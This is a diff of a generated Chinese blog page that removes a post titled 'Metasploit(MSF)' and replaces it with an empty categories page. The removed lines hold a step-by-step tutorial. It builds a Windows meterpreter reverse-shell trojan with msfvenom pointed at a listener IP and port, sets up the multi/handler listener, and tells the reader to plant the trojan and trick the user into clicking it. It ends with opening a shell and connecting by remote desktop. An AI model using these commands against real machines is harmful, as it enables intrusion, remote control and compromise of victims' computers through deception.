@@ -6,20 +6,16 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Metasploit(MSF) | EkEk的个人博客</title>
+  <title>categories | EkEk的个人博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="综合利用工具，集成了上千种漏洞利用方式，操作简单易上手。 kali集成了Metasploit框架，依赖于postgresql数据库  先启动数据库 1/etc/init.d/postgresql start  启动MSF 1msfconsole  利用MSF生成木马获取meterpreter反弹shell 1msfvenom -p windows/meterpreter/reverse_tcp l">
-<meta name="keywords" content="MSF,Metasploit">
-<meta property="og:type" content="article">
-<meta property="og:title" content="Metasploit(MSF)">
-<meta property="og:url" content="http://yoursite.com/2019/03/14/Metasploit-MSF/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="categories">
+<meta property="og:url" content="http://yoursite.com/categories/index.html">
 <meta property="og:site_name" content="EkEk的个人博客">
-<meta property="og:description" content="综合利用工具，集成了上千种漏洞利用方式，操作简单易上手。 kali集成了Metasploit框架，依赖于postgresql数据库  先启动数据库 1/etc/init.d/postgresql start  启动MSF 1msfconsole  利用MSF生成木马获取meterpreter反弹shell 1msfvenom -p windows/meterpreter/reverse_tcp l">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-03-14T12:59:29.395Z">
+<meta property="og:updated_time" content="2019-03-14T13:10:56.016Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Metasploit(MSF)">
-<meta name="twitter:description" content="综合利用工具，集成了上千种漏洞利用方式，操作简单易上手。 kali集成了Metasploit框架，依赖于postgresql数据库  先启动数据库 1/etc/init.d/postgresql start  启动MSF 1msfconsole  利用MSF生成木马获取meterpreter反弹shell 1msfvenom -p windows/meterpreter/reverse_tcp l">
+<meta name="twitter:title" content="categories">
   
     <link rel="alternative" href="/atom.xml" title="EkEk的个人博客" type="application/atom+xml">
   
@@ -155,69 +151,27 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-Metasploit-MSF" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="page-" class="article article-type-page " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      Metasploit(MSF)
+      categories
     </h1>
   
 
         
-        <a href="/2019/03/14/Metasploit-MSF/" class="archive-article-date">
-  	<time datetime="2019-03-14T06:03:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-14</time>
+        <a href="/categories/index.html" class="archive-article-date">
+  	<time datetime="2019-03-14T13:10:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-14</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>综合利用工具，集成了上千种漏洞利用方式，操作简单易上手。</p>
-<p>kali集成了Metasploit框架，依赖于postgresql数据库</p>
-<ol>
-<li><p>先启动数据库</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>启动MSF</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>利用MSF生成木马获取meterpreter反弹shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.14 lport=8787 -f exe &gt;./demo.exe</span><br></pre></td></tr></table></figure>
-<p>-p  选用什么payload<br>lhost  监听ip<br>lport  监听端口<br>-f  生成文件的类型</p>
-</li>
-<li><p>投放木马到目标机上</p>
-</li>
-<li><p>启用MSF，具体操作如下：</p>
-<ol>
-<li><p>加载expuse </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/multi/handler</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>加载payload（要和生成木马选用的payload一致）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>查看哪些参数是需要输入的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">show opptions</span><br><span class="line">#设置监听的IP</span><br><span class="line">set lhost 192.168.10.14</span><br><span class="line">#设置监听的端口</span><br><span class="line">set lport 8787</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>运行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run/exploit</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>诱导用户点击我们的木马程序</p>
-</li>
-<li><p>等待用户上线，就能得到meterpreter,</p>
-</li>
-<li><p>执行shell 进到被攻击者电脑的终端</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>添加添加用户  开机3389 连接桌面(</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.10.19</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-</li>
-</ol>
-
+        
       
 
       
@@ -246,33 +200,7 @@
     <div class="article-info article-info-index">
       
       
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">MSF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Metasploit</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
       
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/学习笔记//" class="article-tag-list-link color5">学习笔记</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
 
       
 
@@ -322,7 +250,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/03/14/Metasploit-MSF/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/categories/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -334,16 +262,6 @@
 </article>
 
   
-<nav id="article-nav">
-  
-  
-    <a href="/2019/03/14/centos7使用firewalld/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">centos7使用firewalld</div>
-      <i class="icon-circle-right"></i>
-    </a>
-  
-</nav>
-
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -394,7 +312,7 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: true,
+		isPost: false,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
